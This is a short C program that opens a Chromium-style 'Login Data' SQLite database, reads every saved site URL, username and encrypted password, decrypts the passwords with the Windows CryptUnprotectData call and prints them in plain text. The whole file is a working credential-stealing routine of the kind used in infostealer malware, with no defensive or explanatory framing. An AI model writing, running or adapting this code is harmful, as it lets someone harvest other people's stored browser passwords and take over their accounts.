#include<ctype.h>
#include<stdio.h>
#include<stdlib.h>
#include<sqlite3.h>
#include<windows.h>
#include<Wincrypt.h>
int main()

{

    int rc;
    sqlite3 *db;
    rc=sqlite3_open("Login Data",&db);
    if(rc)
    {
        printf("open error\n");
    }
    else
    {
        printf("Data db open\n");
    }
    const char *sql="SELECT origin_url, username_value, password_value FROM logins";
    sqlite3_stmt *pstmt;
    rc=sqlite3_prepare(db,sql,-1,&pstmt,0);
    if(rc!=SQLITE_OK)
    {
        printf("ERROR IN PREPARE STATEMENT");
    }
    else
    {
        printf("Statement prepared\n");
    }
    rc=sqlite3_step(pstmt);
    while(rc==SQLITE_ROW)
    {

        printf("%s\t%s\t",sqlite3_column_text(pstmt,0),sqlite3_column_text(pstmt,1));
        DATA_BLOB encrypted_pass,decryptedpass;
        encrypted_pass.cbData=(DWORD)sqlite3_column_bytes(pstmt,2);
        encrypted_pass.pbData=(byte*)malloc((int)encrypted_pass.cbData);
        memcpy(encrypted_pass.pbData,sqlite3_column_blob(pstmt,2),(int)encrypted_pass.cbData);
        CryptUnprotectData(&encrypted_pass,NULL,NULL,NULL,NULL,0,&decryptedpass);

        char *c=(char*)decryptedpass.pbData;
        while(isprint(*c))
        {
            printf("%c",*c);
            c++;
        }
        printf("\n");
        rc = sqlite3_step(pstmt);
    }


}
